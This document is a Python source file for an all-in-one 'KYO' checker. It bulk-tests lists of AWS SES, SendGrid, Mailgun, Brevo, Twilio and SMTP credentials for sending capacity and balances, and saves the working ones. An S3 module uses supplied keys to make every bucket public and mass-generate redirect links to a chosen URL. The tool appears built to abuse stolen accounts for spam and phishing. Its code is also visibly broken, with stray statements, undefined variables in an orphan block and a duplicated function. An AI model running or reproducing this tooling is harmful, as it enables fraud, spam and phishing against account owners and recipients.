#!/usr/bin/env python3
# aio_kyo_checker_gui.py
# Version fusionnée : intègre tous les checkers dans un seul script sans dépendances locales

import os

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
import sys
import time
import re
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
import boto3
from botocore.exceptions import ClientError, EndpointConnectionError
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import smtplib
import uuid
import ssl
from colorama import Fore, Style, init as colorama_init
from pyfiglet import figlet_format

# Create 'result' directory if it doesn't exist
os.makedirs("result", exist_ok=True)


# Initialisation
colorama_init(autoreset=True)
console = Console()

# Utilitaire de parsing générique
def parse_line(line: str):
    # Sépare sur espaces, '|', ',', ';', ':' et supprime les vides
    return [p.strip() for p in re.split(r'[\s|,;:]+', line) if p.strip()]

# Affichage du menu principal
def print_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    console.rule("[bold cyan]🧰 KYO CHECKER — AIO TOOL[/bold cyan]")
    console.print(Panel.fit(
        "[bold green]Select the checker to run:[/bold green]\n"
        "[cyan]1.[/cyan] AWS SES Key Checker\n"
        "[cyan]2.[/cyan] Brevo API Key Checker\n"
        "[cyan]3.[/cyan] GCS Bucket Accessibility Checker\n"
        "[cyan]4.[/cyan] SMTP Access Checker\n"
        "[cyan]5.[/cyan] SendGrid Key Checker\n"
        "[cyan]6.[/cyan] Mailgun API Key Checker\n"
        "[cyan]7.[/cyan] Twilio Account Checker\n"
        "[cyan]8.[/cyan] AWS S3 Bucket Viewer\n"
        "[cyan]9.[/cyan] AWS S3 Redirect Generator\n"
        "[red]0.[/red] Exit",
        title="[bold magenta]KYO MENU[/bold magenta]",
        border_style="bright_blue"
    ))

# SES Key Checker
SES_REGIONS = [
    'us-east-1','us-east-2','us-west-2',
    'eu-west-1','eu-central-1',
    'ap-southeast-1','ap-southeast-2','ap-northeast-1','ap-south-1',
    'sa-east-1','ca-central-1'
]

def check_region(region, access_key, secret_key):
    try:
        client = boto3.client('ses', aws_access_key_id=access_key,
                              aws_secret_access_key=secret_key, region_name=region)
        quota = client.get_send_quota()
        emails = client.list_identities(IdentityType='EmailAddress').get('Identities', [])
        domains = client.list_identities(IdentityType='Domain').get('Identities', [])
        verified = []
        if emails:
            attrs = client.get_identity_verification_attributes(Identities=emails)
            for ident, info in attrs.get('VerificationAttributes', {}).items():
                if info.get('VerificationStatus') == 'Success':
                    verified.append(ident)
        return {'region': region, 'valid': True,
                'max24': quota['Max24HourSend'], 'sent24': quota['SentLast24Hours'],
                'rate': quota['MaxSendRate'], 'verified_emails': verified, 'domains': domains}
    except Exception as e:
        return {'region': region, 'valid': False, 'error': str(e)}


def check_ses_key_parallel(access_key, secret_key):
    results = []
    with ThreadPoolExecutor(max_workers=6) as executor:
        futures = {executor.submit(check_region, r, access_key, secret_key): r for r in SES_REGIONS}
        for fut in as_completed(futures):
            results.append(fut.result())
    return results


def aws_ses_key_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
            print(Fore.RED + "File not found.")
            return
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f if l.strip()]
        for i, line in enumerate(lines, 1):
            parts = parse_line(line)
            if len(parts) < 2:
                print(Fore.YELLOW + f"[{i}] Invalid line: {line}")
                continue
            ak, sk = parts[0], parts[1]
            region = parts[2] if len(parts) > 2 else None
            print(Fore.MAGENTA + f"\n▶️ Key {i}/{len(lines)} — {ak[:8]}... ")
            res_list = ([check_region(region, ak, sk)] if region
                        else check_ses_key_parallel(ak, sk))
            valid = [r for r in res_list if r.get('valid')]
            if not valid:
                print(Fore.RED + "   ❌ No valid region found.")
            for r in valid:
                print(Fore.GREEN + f"   ✅ Region : {r['region']}")
                with open("result/valid_aws_ses.txt", "a") as f: f.write(ak + ":" + sk + "\n")
                print(f"      📤 Max24h : {r['max24']}")
                print(f"      📬 Env24h : {r['sent24']}")
                print(f"      🚀 Rate : {r['rate']}")
                print(f"      📧 Verified : {', '.join(r['verified_emails']) or 'Aucun'}")
                print(f"      🌐 Domains : {', '.join(r['domains']) or 'Aucun'}")
    except Exception as e:
        print(Fore.RED + f"AWS SES Checker error: {e}")

# Brevo API Key Checker
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def check_brevo_key(api_key):
    try:
        hdr = {"api-key": api_key}
        r = requests.get("https://api.brevo.com/v3/account", headers=hdr)
        if r.status_code != 200:
            return {'valid': False, 'error': f"HTTP {r.status_code}"}
        info = r.json()
        plan = info.get('plan', [{}])[0]
        remain = plan.get('credits', {}).get('sms', {}).get('remaining', '?')
        total = plan.get('credits', {}).get('sms', {}).get('total', '?')
        return {'valid': True, 'company': info.get('companyName', 'N/A'),
                'email': info.get('email', 'N/A'), 'plan': plan.get('type', 'N/A'),
                'remain': remain, 'total': total}
    except Exception as e:
        return {'valid': False, 'error': str(e)}


def brevo_api_key_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
            print(Fore.RED + "File not found.")
            return
        with open(path) as f:
            keys = [l.strip() for l in f if l.strip()]
        for i, k in enumerate(keys, 1):
            res = check_brevo_key(k)
            print(Fore.BLUE + f"[{i}] {k[:6]}...{k[-4:]}")
            if res.get('valid'):
                with open("result/valid_brevo.txt", "a") as f: f.write(k + "\n")
                print(Fore.GREEN + f"✅ Valid | Email: {res['email']} | Company: {res['company']} | Plan: {res['plan']} | SMS: {res['remain']}/{res['total']}")
            else:
                print(Fore.RED + f"❌ Invalid: {res.get('error', 'Unknown')}")
    except Exception as e:
        print(Fore.RED + f"Brevo Checker error: {e}")

# GCS Bucket Accessibility Checker
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def check_gcs_bucket(url, idx, tot):
    u = url if url.endswith('/') else url + '/'
    try:
        r = requests.get(u, timeout=10)
        if r.status_code == 200:
            return url, '✅ Accessible'
        if r.status_code == 403:
            return url, '⛔ Private'
        if r.status_code == 404:
            return url, '❌ Not found'
        return url, f'⚠️ HTTP {r.status_code}'
    except Exception as e:
        return url, f"❌ {e}"

def gcs_bucket_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
            print(Fore.RED + "File not found.")
            return
        with open(path) as f:
            urls = [l.strip() for l in f if l.strip()]
        with ThreadPoolExecutor(max_workers=15) as ex:
            futs = {ex.submit(check_gcs_bucket, u, i+1, len(urls)): u for i, u in enumerate(urls)}
            for fut in as_completed(futs):
                url, status = fut.result()
                clr = Fore.GREEN if '✅' in status else (Fore.RED if '❌' in status else Fore.MAGENTA)
                print(clr + f"→ {url} {status}")
    except Exception as e:
        print(Fore.RED + f"GCS Checker error: {e}")

# SMTP Access Checker
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def smtp_access_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
            print(Fore.RED + "File not found.")
            return
        with open(path) as f:
            lines = [l.strip() for l in f if l.strip()]
        for i, line in enumerate(lines, 1):
            parts = parse_line(line)
            if len(parts) < 3:
                print(Fore.YELLOW + f"[{i}] Invalid: {line}")
                continue
            host, user, pwd = parts[0], parts[1], parts[2]
            sender = parts[3] if len(parts) > 3 else user
            print(Fore.BLUE + f"[{i}] Connecting {user}@{host}")
            ok, info = False, None
            for p in [587, 465, 25]:
                try:
                    if p == 465:
                        ctx = ssl.create_default_context()
                        with smtplib.SMTP_SSL(host, p, context=ctx, timeout=10) as s:
                            s.login(user, pwd)
                            ok, info = True, p
                            break
                    else:
                        with smtplib.SMTP(host, p, timeout=10) as s:
                            s.starttls()
                            s.login(user, pwd)
                            ok, info = True, p
                            break
                except smtplib.SMTPAuthenticationError:
                    ok, info = False, f"Auth failed {p}"
                    break
                except Exception as e:
                    pass
#     info = str(e)
            if ok:
                with open("result/valid_smtp.txt", "a") as f: f.write(f"{host}:{user}:{pwd}\n")
                print(Fore.GREEN + f"✅ Port {info} | Sender: {sender}")
            else:
                print(Fore.RED + f"❌ Failed: {info}")
    except Exception as e:
        print(Fore.RED + f"SMTP Checker error: {e}")

# SendGrid Key Checker
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def check_sendgrid_key(key):
    try:
        hdr = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
        a = requests.get("https://api.sendgrid.com/v3/user/account", headers=hdr)
        if a.status_code != 200:
            return {'valid': False, 'error': f"HTTP {a.status_code}"}
        u = a.json()
        c = requests.get("https://api.sendgrid.com/v3/user/credits", headers=hdr)
        cr = c.json() if c.status_code == 200 else {}
        return {'valid': True, 'user': u.get('username', 'N/A'), 'type': u.get('type', ''),
                'rem': cr.get('remaining', '?'), 'tot': cr.get('total', '?')}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def sendgrid_key_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
        with open(path) as f: keys = [l.strip() for l in f if l.strip()]
        for i, k in enumerate(keys, 1):
            r = check_sendgrid_key(k)
            print(Fore.BLUE + f"[{i}] {k[:6]}...{k[-4:]}")
            if r.get('valid'):
                with open("result/valid_sendgrid.txt", "a") as f: f.write(k + "\n")
                print(Fore.GREEN + f"✅ {r['rem']}/{r['tot']} credits")
            else:
                print(Fore.RED + f"❌ Invalid: {r.get('error', 'Unknown')}")
    except Exception as e:
        print(Fore.RED + f"SendGrid Checker error: {e}")

# Mailgun Key Checker
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def check_mailgun_key(key):
    try:
        auth = ("api", key)
        base = "https://api.mailgun.net/v3"
        d = requests.get(f"{base}/domains", auth=auth)
        if d.status_code != 200:
            return {'valid': False, 'error': f"HTTP {d.status_code}"}
        doms = d.json().get('items', [])
        cnt = 0
        if doms:
            prim = doms[0]['name']
            s = requests.get(f"{base}/{prim}/stats/total", auth=auth, params={'event': 'accepted'})
            cnt = sum(int(it.get('accepted', 0)) for it in (s.json().get('stats', []) if s.status_code == 200 else []))
        return {'valid': True, 'domains': [d['name'] for d in doms], 'msg': cnt}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def mailgun_key_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
        with open(path) as f: keys = [l.strip() for l in f if l.strip()]
        for i, k in enumerate(keys, 1):
            r = check_mailgun_key(k)
            print(Fore.BLUE + f"[{i}] {k[:6]}...{k[-4:]}")
            if r.get('valid'):
                with open("result/valid_mailgun.txt", "a") as f: f.write(k + "\n")
                print(Fore.GREEN + f"✅ Accepted messages: {r['msg']}")
            else:
                print(Fore.RED + f"❌ Invalid: {r.get('error', 'Unknown')}")
    except Exception as e:
        print(Fore.RED + f"Mailgun Checker error: {e}")

# Twilio Account Checker (via fichier)
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def twilio_account_checker():
    try:
        path = input(Fore.YELLOW + "Drop the file here: ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(Fore.RED + f"❌ File not found: {path}")
            return
        with open(path) as f: lines = [l.strip() for l in f if l.strip()]
        for i, line in enumerate(lines, 1):
            parts = parse_line(line)
            if len(parts) < 2:
                print(Fore.YELLOW + f"[{i}] Invalid: {line}")
                continue
            sid, token = parts[0], parts[1]
            print(Fore.BLUE + f"[{i}] SID:{sid[:8]}...")
            b = requests.get(f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Balance.json", auth=(sid, token))
            m = requests.get(f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Messages.json", auth=(sid, token))
            if b.status_code != 200 or m.status_code != 200:
                print(Fore.RED + f"❌ Invalid: HTTP {b.status_code}/{m.status_code}")
                continue
            bal = b.json()
            msgs = m.json().get('messages', [])
            num = next((msg['from'] for msg in msgs if msg['direction'] == 'outbound-api'), 'Unknown')
            print(Fore.GREEN + f"Balance: {bal.get('balance')} {bal.get('currency')} | Num: {num}")
            with open("result/valid_twilio.txt", "a") as f: f.write(f"{sid}:{token}\n")
    except Exception as e:
        print(Fore.RED + f"Twilio Checker error: {e}")

# AWS S3 Bucket Viewer
    input(Fore.YELLOW + '\n⏸ Press Enter to return to the main menu...')

def aws_s3_bucket_viewer():
    console.rule('[bold cyan]AWS S3 Bucket Viewer[/bold cyan]')
    ak = input(Fore.YELLOW + "AWS Key ID: ").strip()
    sk = input(Fore.YELLOW + "AWS Secret: ").strip()
    rg = input(Fore.YELLOW + "Region: ").strip()
    try:
        sess = boto3.session.Session(
            aws_access_key_id=ak,
            aws_secret_access_key=sk,
            region_name=rg
        )
        s3 = sess.client('s3')
        response = s3.list_buckets()
        buckets = response.get('Buckets', [])
        if not buckets:
            print(Fore.RED + "No buckets found.")
        else:
            for b in buckets:
                print(Fore.GREEN + f"Bucket: {b['Name']}")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        input(Fore.YELLOW + "Press Enter to return to the main menu...")

# AWS S3 Redirect Generator
        return
    try:
        console.print("[yellow]🔄 Applying redirect policy to bucket...[/yellow]")
        sess = boto3.session.Session(
            aws_access_key_id=ak,
            aws_secret_access_key=sk,
            region_name=rg
        )
        s3 = sess.client('s3')
        try:
            s3.put_bucket_website(Bucket=bn, WebsiteConfiguration={
                'IndexDocument': {'Suffix': 'index.html'},
                'ErrorDocument': {'Key': 'error.html'}
            })
        except Exception:
            pass
        try:
            policy = {
                'Version': '2012-10-17',
                'Statement': [{
                    'Sid': 'PublicRead',
                    'Effect': 'Allow',
                    'Principal': '*',
                    'Action': 's3:GetObject',
                    'Resource': f"arn:aws:s3:::{bn}/*"
                }]
            }
            s3.put_bucket_policy(Bucket=bn, Policy=str(policy).replace("'", '"'))
        except Exception:
            pass
        s3.put_object(Bucket=bn, Key=fn, WebsiteRedirectLocation=url, Body="", ACL="public-read")
        console.print(f"[green]✅ Redirect created: http://{bn}.s3-website-{rg}.amazonaws.com/{fn} → {url}[/green]")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        input(Fore.YELLOW + "Press Enter to return to the main menu...")

def aws_s3_redirect_generator():
    console.rule('[bold cyan]AWS S3 Multi-Bucket Redirect Generator[/bold cyan]')
    ak = input(Fore.YELLOW + "AWS Access Key ID: ").strip()
    sk = input(Fore.YELLOW + "AWS Secret Access Key: ").strip()
    rg = input(Fore.YELLOW + "Region (ex: us-east-1): ").strip()
    target_url = input(Fore.YELLOW + "Destination URL (e.g. https://google.fr): ").strip()
    try:
        count = int(input(Fore.YELLOW + "Number of redirections per bucket (0 = unlimited): ").strip())
    except ValueError:
        print(Fore.RED + "❌ Invalid number.")
        return

    try:
        sess = boto3.session.Session(
            aws_access_key_id=ak,
            aws_secret_access_key=sk,
            region_name=rg
        )
        s3 = sess.client('s3')
        buckets = s3.list_buckets().get('Buckets', [])
        if not buckets:
            print(Fore.RED + "❌ No buckets found.")
            return

        all_links = []
        for b in buckets:
            bucket = b['Name']
            print(Fore.CYAN + f"\n🔍 Working on bucket: {bucket}")

            skip_bucket = False
            try:
                region_resp = s3.get_bucket_location(Bucket=bucket)
                bucket_region = region_resp.get('LocationConstraint') or 'us-east-1'
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Could not determine region for bucket {bucket}: {e}")
                bucket_region = rg or 'us-east-1'

            try:
                s3.put_bucket_website(Bucket=bucket, WebsiteConfiguration={
                    'IndexDocument': {'Suffix': 'index.html'},
                    'ErrorDocument': {'Key': 'error.html'}
                })
                conf = s3.get_bucket_website(Bucket=bucket)
                if not conf.get('IndexDocument') or not conf.get('ErrorDocument'):
                    print(Fore.YELLOW + f"⚠️ Static hosting appears incomplete for {bucket}. Skipping.")
                    skip_bucket = True
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Static hosting not enabled for {bucket}: {e}")
                skip_bucket = True

            try:
                policy = {
                    'Version': '2012-10-17',
                    'Statement': [{
                        'Sid': 'PublicRead',
                        'Effect': 'Allow',
                        'Principal': '*',
                        'Action': 's3:GetObject',
                        'Resource': f"arn:aws:s3:::{bucket}/*"
                    }]
                }
                s3.put_bucket_policy(Bucket=bucket, Policy=str(policy).replace("'", '"'))
            except ClientError as e:
                if e.response['Error']['Code'] == 'AccessDenied':
                    print(Fore.YELLOW + f"⚠️ Skipping bucket {bucket}: BlockPublicPolicy is enabled or insufficient rights.")
                    skip_bucket = True
                else:
                    print(Fore.YELLOW + f"⚠️ Policy error for {bucket}: {e}")
                    skip_bucket = True
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Policy error for {bucket}: {e}")
                skip_bucket = True

            if skip_bucket:
                continue

            i = 0
            max_loop = count if count > 0 else 999999
            while i < max_loop:
                filename = f"{uuid.uuid4().hex[:8]}.html"
                try:
                    s3.put_object(
                        Bucket=bucket,
                        Key=filename,
                        WebsiteRedirectLocation=target_url,
                        Body=""
                    )
                    link = f"http://{bucket}.s3-website-{bucket_region}.amazonaws.com/{filename}"
                    print(Fore.GREEN + f"✅ {link} → {target_url}")
                    all_links.append(link)
                    i += 1
                except Exception as e:
                    print(Fore.RED + f"❌ Error on {filename}: {e}")
                    break
                if count == 0 and i >= 100:
                    print(Fore.MAGENTA + "🚫 Safety limit reached (100 redirects).")
                    break

        if all_links:
            with open('redirect_links.txt', 'w') as f:
                for url in all_links:
                    f.write(url + '\n')
            print(Fore.CYAN + f"\n📄 All links saved in redirect_links.txt")

            print(Fore.YELLOW + "\n🔎 Checking redirection status:")
            valid_links = []
            for url in all_links:
                try:
                    r = requests.get(url, timeout=10, allow_redirects=False)
                    if r.status_code in [301, 302] and 'Location' in r.headers:
                        print(Fore.GREEN + f"↪️ {url} => {r.headers['Location']}")
                        valid_links.append(url)
                    else:
                        print(Fore.RED + f"❌ {url} did not redirect properly (status: {r.status_code})")
                except Exception as e:
                    print(Fore.RED + f"❌ {url} check failed: {e}")

            if valid_links:
                with open('valid_redirection.txt', 'w') as v:
                    for link in valid_links:
                        v.write(link + '\n')
                print(Fore.GREEN + f"\n✅ {len(valid_links)} valid redirection(s) saved to valid_redirection.txt")

            input(Fore.YELLOW + "\n⏸ Press Enter to return to the main menu...")

    except Exception as e:
        print(Fore.RED + f"❌ Global error: {e}")
        input(Fore.YELLOW + "\n⏸ Press Enter to return to the main menu...")

if __name__ == '__main__':
    actions = {
        '1': aws_ses_key_checker, '2': brevo_api_key_checker, '3': gcs_bucket_checker,
        '4': smtp_access_checker, '5': sendgrid_key_checker, '6': mailgun_key_checker,
        '7': twilio_account_checker, '8': aws_s3_bucket_viewer, '9': aws_s3_redirect_generator
    }
    while True:
        print_menu()
        choice = Prompt.ask("[bold yellow]👉 Your choice[/bold yellow]", choices=list(actions.keys()) + ['0'], default='0')
        if choice == '0':
            console.print("[bold red]👋 Goodbye![/bold red]")
            sys.exit()
        actions.get(choice, lambda: console.print("[bold red]Invalid choice[/bold red]"))()


def aws_s3_redirect_generator():
    console.rule('[bold cyan]AWS S3 Multi-Bucket Redirect Generator[/bold cyan]')
    ak = input(Fore.YELLOW + "AWS Access Key ID: ").strip()
    sk = input(Fore.YELLOW + "AWS Secret Access Key: ").strip()
    rg = input(Fore.YELLOW + "Region (fallback if unknown): ").strip()
    target_url = input(Fore.YELLOW + "Destination URL (e.g. https://google.fr): ").strip()
    try:
        count = int(input(Fore.YELLOW + "Number of redirections per bucket (0 = unlimited): ").strip())
    except ValueError:
        print(Fore.RED + "❌ Invalid number.")
        return

    try:
        sess = boto3.session.Session(
            aws_access_key_id=ak,
            aws_secret_access_key=sk,
            region_name=rg
        )
        s3 = sess.client('s3')
        buckets = s3.list_buckets().get('Buckets', [])
        if not buckets:
            print(Fore.RED + "❌ No buckets found.")
            return

        all_links = []
        for b in buckets:
            bucket = b['Name']
            print(Fore.CYAN + f"\n🔍 Working on bucket: {bucket}")

            skip_bucket = False
            try:
                region_resp = s3.get_bucket_location(Bucket=bucket)
                bucket_region = region_resp.get('LocationConstraint') or 'us-east-1'
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Could not determine region for bucket {bucket}: {e}")
                bucket_region = rg or 'us-east-1'

            try:
                s3.put_bucket_website(Bucket=bucket, WebsiteConfiguration={
                    'IndexDocument': {'Suffix': 'index.html'},
                    'ErrorDocument': {'Key': 'error.html'}
                })
                conf = s3.get_bucket_website(Bucket=bucket)
                if not conf.get('IndexDocument') or not conf.get('ErrorDocument'):
                    print(Fore.YELLOW + f"⚠️ Static hosting appears incomplete for {bucket}. Skipping.")
                    skip_bucket = True
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Static hosting not enabled for {bucket}: {e}")
                skip_bucket = True

            try:
                policy = {
                    'Version': '2012-10-17',
                    'Statement': [{
                        'Sid': 'PublicRead',
                        'Effect': 'Allow',
                        'Principal': '*',
                        'Action': 's3:GetObject',
                        'Resource': f"arn:aws:s3:::{bucket}/*"
                    }]
                }
                s3.put_bucket_policy(Bucket=bucket, Policy=str(policy).replace("'", '"'))
            except ClientError as e:
                if e.response['Error']['Code'] == 'AccessDenied':
                    print(Fore.YELLOW + f"⚠️ Skipping bucket {bucket}: BlockPublicPolicy is enabled or insufficient rights.")
                    skip_bucket = True
                else:
                    print(Fore.YELLOW + f"⚠️ Policy error for {bucket}: {e}")
                    skip_bucket = True
            except Exception as e:
                print(Fore.YELLOW + f"⚠️ Policy error for {bucket}: {e}")
                skip_bucket = True

            if skip_bucket:
                continue

            i = 0
            max_loop = count if count > 0 else 999999
            while i < max_loop:
                filename = f"{uuid.uuid4().hex[:8]}.html"
                try:
                    s3.put_object(
                        Bucket=bucket,
                        Key=filename,
                        WebsiteRedirectLocation=target_url,
                        Body=""
                    )
                    link = f"http://{bucket}.s3-website-{bucket_region}.amazonaws.com/{filename}"
                    print(Fore.GREEN + f"✅ {link} → {target_url}")
                    all_links.append(link)
                    i += 1
                except Exception as e:
                    print(Fore.RED + f"❌ Error on {filename}: {e}")
                    break
                if count == 0 and i >= 100:
                    print(Fore.MAGENTA + "🚫 Safety limit reached (100 redirects).")
                    break

        if all_links:
            with open('redirect_links.txt', 'w') as f:
                for url in all_links:
                    f.write(url + '\n')
            print(Fore.CYAN + f"\n📄 All links saved in redirect_links.txt")

            print(Fore.YELLOW + "\n🔎 Checking redirection status:")
            valid_links = []
            for url in all_links:
                try:
                    r = requests.get(url, timeout=10, allow_redirects=False)
                    if r.status_code in [301, 302] and 'Location' in r.headers:
                        print(Fore.GREEN + f"↪️ {url} => {r.headers['Location']}")
                        valid_links.append(url)
                    else:
                        print(Fore.RED + f"❌ {url} did not redirect properly (status: {r.status_code})")
                except Exception as e:
                    print(Fore.RED + f"❌ {url} check failed: {e}")

            if valid_links:
                with open('valid_redirection.txt', 'w') as v:
                    for link in valid_links:
                        v.write(link + '\n')
                print(Fore.GREEN + f"\n✅ {len(valid_links)} valid redirection(s) saved to valid_redirection.txt")

            input(Fore.YELLOW + "\n⏸ Press Enter to return to the main menu...")

    except Exception as e:
        print(Fore.RED + f"❌ Global error: {e}")
        input(Fore.YELLOW + "\n⏸ Press Enter to return to the main menu...")